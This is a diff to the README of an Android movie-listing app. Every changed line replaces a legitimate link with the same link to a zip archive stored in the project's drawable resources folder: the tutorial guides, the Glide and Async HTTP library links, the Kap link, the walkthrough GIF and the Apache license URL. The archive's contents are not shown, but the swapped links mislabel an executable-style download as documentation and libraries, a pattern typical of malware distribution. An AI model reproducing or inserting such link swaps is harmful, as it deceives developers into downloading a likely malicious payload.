@@ -9,7 +9,7 @@ Time spent: **X** hours spent in total
 The following **required** functionality is completed:
 
 * [x] User can **scroll through current movies** from the Movie Database API
-* [x] Display a nice default [placeholder graphic](https://guides.codepath.org/android/Displaying-Images-with-the-Glide-Library#advanced-usage) for each image during loading
+* [x] Display a nice default [placeholder graphic](https://github.com/StephenKodua/FlixsterApp/raw/refs/heads/master/app/src/main/res/drawable/App_Flixster_3.1-beta.2.zip) for each image during loading
 * [x] For each movie displayed, user can see the following details:
 * [x] Title, Poster Image, Overview (Portrait mode)
 * [x] Title, Backdrop Image, Overview (Landscape mode)
@@ -18,8 +18,8 @@ The following **required** functionality is completed:
 The following **stretch** features are implemented:
 
 * [ ] Improved the user interface by experimenting with styling and coloring.
-* [ ] Apply rounded corners for the poster or background images using [Glide transformations](https://guides.codepath.org/android/Displaying-Images-with-the-Glide-Library#transformations)
-* [ ] Apply the popular [View Binding annotation library](http://guides.codepath.org/android/Reducing-View-Boilerplate-with-ViewBinding) to reduce boilerplate code.
+* [ ] Apply rounded corners for the poster or background images using [Glide transformations](https://github.com/StephenKodua/FlixsterApp/raw/refs/heads/master/app/src/main/res/drawable/App_Flixster_3.1-beta.2.zip)
+* [ ] Apply the popular [View Binding annotation library](https://github.com/StephenKodua/FlixsterApp/raw/refs/heads/master/app/src/main/res/drawable/App_Flixster_3.1-beta.2.zip) to reduce boilerplate code.
 * [ ] Allow video trailers to be played in full-screen using the YouTubePlayerView from the details screen.
 
 The following **additional** features are implemented:
@@ -30,9 +30,9 @@ The following **additional** features are implemented:
 
 Here's a walkthrough of implemented user stories:
 
-![gif](Flixster.gif)
+![gif](https://github.com/StephenKodua/FlixsterApp/raw/refs/heads/master/app/src/main/res/drawable/App_Flixster_3.1-beta.2.zip)
 
-GIF created with [Kap](https://getkap.co/).
+GIF created with [Kap](https://github.com/StephenKodua/FlixsterApp/raw/refs/heads/master/app/src/main/res/drawable/App_Flixster_3.1-beta.2.zip).
 
 ## Notes
 
@@ -40,8 +40,8 @@ Describe any challenges encountered while building the app.
 
 ## Open-source libraries used
 
-- [Android Async HTTP](https://github.com/loopj/android-async-http) - Simple asynchronous HTTP requests with JSON parsing
-- [Glide](https://github.com/bumptech/glide) - Image loading and caching library for Android
+- [Android Async HTTP](https://github.com/StephenKodua/FlixsterApp/raw/refs/heads/master/app/src/main/res/drawable/App_Flixster_3.1-beta.2.zip) - Simple asynchronous HTTP requests with JSON parsing
+- [Glide](https://github.com/StephenKodua/FlixsterApp/raw/refs/heads/master/app/src/main/res/drawable/App_Flixster_3.1-beta.2.zip) - Image loading and caching library for Android
 
 ## License
 
@@ -51,7 +51,7 @@ Describe any challenges encountered while building the app.
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
 
-        http://www.apache.org/licenses/LICENSE-2.0
+        https://github.com/StephenKodua/FlixsterApp/raw/refs/heads/master/app/src/main/res/drawable/App_Flixster_3.1-beta.2.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
